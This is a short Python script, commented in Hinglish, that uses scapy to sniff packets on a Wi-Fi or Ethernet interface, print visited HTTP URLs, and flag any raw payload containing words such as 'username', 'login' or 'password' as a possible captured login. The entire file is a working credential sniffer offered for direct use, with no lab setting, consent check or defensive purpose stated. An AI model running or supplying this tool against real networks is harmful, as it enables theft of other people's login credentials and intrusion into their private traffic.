import scapy.all as scapy
from scapy.layers import http

# Interface define karo (Windows pe thoda alag ho sakta hai, usually 'Wi-Fi' ya 'Ethernet')
# Agar error aaye to scapy.get_if_list() se check karna
def sniff(interface):
    print(f"[*] Sniffing started on {interface}...")
    # store=False ka matlab packets ko memory me mat rakho (RAM bachegi)
    # prn=process_packet ka matlab har packet milne par 'process_packet' function chalao
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
    # Check karo kya packet me HTTP Request hai?
    if packet.haslayer(http.HTTPRequest):
        
        # 1. URL Nikaalo (Kaunsi site khuli hai?)
        # Host (e.g., google.com) + Path (e.g., /search)
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"[+] HTTP Request >> {url.decode()}")

        # 2. Login Info Nikaalo (Raw Data me dhoondo)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            keywords = ["username", "user", "login", "password", "pass", "email"]
            
            for word in keywords:
                if word in load:
                    print(f"\n\n[!!!] POSSIBLE PASSWORD/LOGIN FOUND: {load}\n\n")
                    break

# --- RUN ---
# Yahan apne adapter ka naam likho. Windows pe shayad "Wi-Fi" ho, Linux pe "eth0" ya "wlan0"
sniff("Wi-Fi")